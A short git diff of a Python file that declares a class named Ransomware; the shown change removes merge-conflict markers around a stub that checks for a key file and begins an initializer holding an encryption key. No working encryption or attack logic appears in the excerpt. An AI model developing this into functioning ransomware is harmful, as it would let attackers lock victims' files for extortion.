@@ -7,13 +7,10 @@ import os #to get root system
 
 # declare a class called ransomeware
 class Ransomware:
-<<<<<<< HEAD
 
     #check if the filekey.key file exists
     file_exists = os.path.isfile("")
     
-=======
->>>>>>> 5c984b8 (Addedd somethings)
     
     def __init__(self):
         # key that will be used to encrypt and decrypt files
